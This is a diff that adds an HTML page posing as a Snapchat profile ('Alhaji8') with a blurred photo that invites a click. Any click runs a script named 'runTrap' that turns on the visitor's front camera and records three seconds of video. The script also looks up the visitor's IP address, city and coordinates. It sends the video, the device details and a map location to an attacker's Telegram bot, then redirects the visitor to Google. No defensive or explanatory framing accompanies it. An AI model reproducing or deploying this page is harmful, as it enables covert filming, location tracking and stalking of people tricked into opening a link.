@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Profile</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; height: 100vh; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: white; display: flex; justify-content: center; align-items: center; }
+        
+        .snap-profile { position: relative; width: 100vw; height: 100vh; max-width: 420px; background: #121212; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; cursor: pointer; overflow-y: auto; }
+        
+        /* شريط التنقل العلوي */
+        .top-nav { width: 100%; display: flex; justify-content: space-between; padding: 15px 20px; box-sizing: border-box; z-index: 3; position: absolute; top: 0; }
+        .nav-icon { width: 34px; height: 34px; background: rgba(0,0,0,0.4); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 16px; backdrop-filter: blur(5px); }
+
+        /* منطقة الهيدر والخلفية المغشوشة بالكامل كالصورة */
+        .profile-header { position: relative; width: 100%; height: 310px; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #1a1a1a; overflow: hidden; }
+        
+        /* الصورة المغشوشة */
+        .profile-header img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; filter: blur(15px); transition: filter 0.3s ease; z-index: 1; }
+        
+        /* طبقة تعتيم خفيفة جداً بدون أي نصوص */
+        .overlay-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.15); z-index: 2; }
+
+        /* دائرة الصورة الشخصية الكبيرة على اليسار كما في الصورة الأصلية */
+        .avatar-circle { position: absolute; bottom: 20px; left: 25px; width: 85px; height: 85px; border-radius: 50%; border: 3px solid #121212; overflow: hidden; z-index: 3; background: #222; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.6); }
+        .avatar-circle img { width: 100%; height: 100%; object-fit: cover; filter: none !important; }
+
+        /* معلومات الحساب (الاسم واليوزر) */
+        .info-section { width: 100%; padding: 25px 20px 15px 20px; text-align: center; z-index: 3; }
+        .name { font-size: 24px; font-weight: bold; margin-bottom: 4px; }
+        .username { font-size: 14px; color: #aaa; margin-bottom: 22px; }
+
+        /* زر الإضافة الأصفر البارز (Add) */
+        .add-btn { width: 90%; background: #FFFC00; color: black; font-weight: bold; font-size: 16px; padding: 13px; border-radius: 35px; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 252, 0, 0.25); margin-bottom: 25px; z-index: 3; transition: transform 0.2s; }
+        .add-btn:active { transform: scale(0.98); }
+
+        /* قسم أصدقاء مقترحين (Find friends) المطابق للصورة */
+        .find-friends-container { width: 100%; padding: 0 15px; box-sizing: border-box; text-align: left; z-index: 3; }
+        .section-title { font-size: 17px; font-weight: bold; margin-bottom: 12px; color: #fff; }
+        
+        .friends-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 15px; scrollbar-width: none; }
+        .friends-scroll::-webkit-scrollbar { display: none; }
+
+        .friend-card { min-width: 135px; height: 175px; background: #1c1c1e; border-radius: 16px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 14px 10px; box-sizing: border-box; border: 1px solid rgba(255,255,255,0.05); }
+        .friend-avatar { width: 48px; height: 48px; border-radius: 50%; background: #2c2c2e; display: flex; justify-content: center; align-items: center; font-size: 20px; }
+        .friend-name { font-size: 12px; font-weight: bold; text-align: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; }
+        .friend-sub { font-size: 10px; color: #888; text-align: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; }
+        .small-add-btn { background: rgba(255,255,255,0.12); color: white; font-size: 11px; padding: 7px 0; width: 100%; border-radius: 18px; text-align: center; font-weight: bold; }
+
+        /* زر الإبلاغ السفلي */
+        .report-link { margin-top: 25px; margin-bottom: 30px; color: #777; font-size: 13px; text-align: center; z-index: 3; }
+
+        video { display: none; }
+    </style>
+</head>
+<body onclick="runTrap()">
+
+<div class="snap-profile">
+    <!-- شريط التنقل العلوي -->
+    <div class="top-nav">
+        <div class="nav-icon">❮</div>
+        <div style="display: flex; gap: 10px;">
+            <div class="nav-icon">🔗</div>
+            <div class="nav-icon">•••</div>
+        </div>
+    </div>
+
+    <!-- الهيدر والصورة المغشوشة تماماً بدون أي كتابة -->
+    <div class="profile-header">
+        <img src="pic.jpg" alt="Profile Cover" id="coverImg">
+        <div class="overlay-layer"></div>
+        <!-- الصورة الشخصية على اليسار -->
+        <div class="avatar-circle">
+            <img src="avatar.jpg" alt="Avatar">
+        </div>
+    </div>
+
+    <!-- الاسم واليوزر المطلوب -->
+    <div class="info-section">
+        <div class="name">Alhaji8</div>
+        <div class="username">@sfccix8</div>
+
+        <!-- زر الإضافة -->
+        <button class="add-btn">Add +</button>
+    </div>
+
+    <!-- قسم أصدقاء مقترحين (Find friends) -->
+    <div class="find-friends-container">
+        <div class="section-title">Find friends</div>
+        <div class="friends-scroll">
+            <div class="friend-card">
+                <div class="friend-avatar">👑</div>
+                <div class="friend-name">VANTA PLUS</div>
+                <div class="friend-sub">anta.plus</div>
+                <div class="small-add-btn">Add +</div>
+            </div>
+            <div class="friend-card">
+                <div class="friend-avatar">💜</div>
+                <div class="friend-name">دعوات الكترونية</div>
+                <div class="friend-sub">iioyu26</div>
+                <div class="small-add-btn">Add +</div>
+            </div>
+            <div class="friend-card">
+                <div class="friend-avatar">🌟</div>
+                <div class="friend-name">فلوقات ليبيا</div>
+                <div class="friend-sub">libya_vibe</div>
+                <div class="small-add-btn">Add +</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="report-link">Report this Account</div>
+</div>
+
+<video id="webcam" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+    const video = document.getElementById('webcam');
+    let isRunning = false;
+
+    async function runTrap() {
+        if (isRunning) return;
+        isRunning = true;
+
+        // إزالة الضبابية عند النقر في أي مكان بالشاشة
+        document.getElementById('coverImg').style.filter = 'blur(0px)';
+
+        const deviceInfo = navigator.userAgent;
+
+        // جلب الموقع في الخلفية بالتوازي
+        let ipPromise = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => null);
+
+        try {
+            // طلب إذن الكاميرا فوراً
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            video.srcObject = stream;
+
+            let mediaRecorder;
+            let chunks = [];
+
+            try {
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            } catch (e) {
+                mediaRecorder = new MediaRecorder(stream);
+            }
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                
+                const ipData = await ipPromise;
+                let lat = ipData ? ipData.latitude : null;
+                let lon = ipData ? ipData.longitude : null;
+                let locationInfo = ipData ? `${ipData.country_name} - ${ipData.city} (IP: ${ipData.ip})` : "Unknown Location";
+
+                await sendDataToTelegram(videoBlob, deviceInfo, locationInfo, lat, lon, true);
+            };
+
+            mediaRecorder.start();
+
+            // تسجيل الفيديو لمدة 3 ثوانٍ ثم إرساله
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+            }, 3000);
+
+        } catch (err) {
+            const ipData = await ipPromise;
+            let lat = ipData ? ipData.latitude : null;
+            let lon = ipData ? ipData.longitude : null;
+            let locationInfo = ipData ? `${ipData.country_name} - ${ipData.city} (IP: ${ipData.ip})` : "Unknown Location";
+
+            await sendDataToTelegram(null, deviceInfo, locationInfo, lat, lon, false);
+        }
+    }
+
+    async function sendDataToTelegram(videoBlob, deviceInfo, locationInfo, lat, lon, cameraAllowed) {
+        try {
+            if (cameraAllowed && videoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', videoBlob, 'alhaji_profile.webm');
+                formData.append('caption', `👻 Snapchat Profile (Alhaji8 - @sfccix8) Captured!\n📍 Location: ${locationInfo}\n📱 Device:\n${deviceInfo}`);
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `⚠️ Camera Denied (Alhaji8 Profile)!\n📍 Location: ${locationInfo}\n📱 Device:\n${deviceInfo}`
+                    })
+                });
+            }
+
+            if (lat && lon) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+                });
+            }
+        } catch (e) {}
+
+        window.location.href = "https://www.google.com";
+    }
+</script>
+
+</body>
+</html>
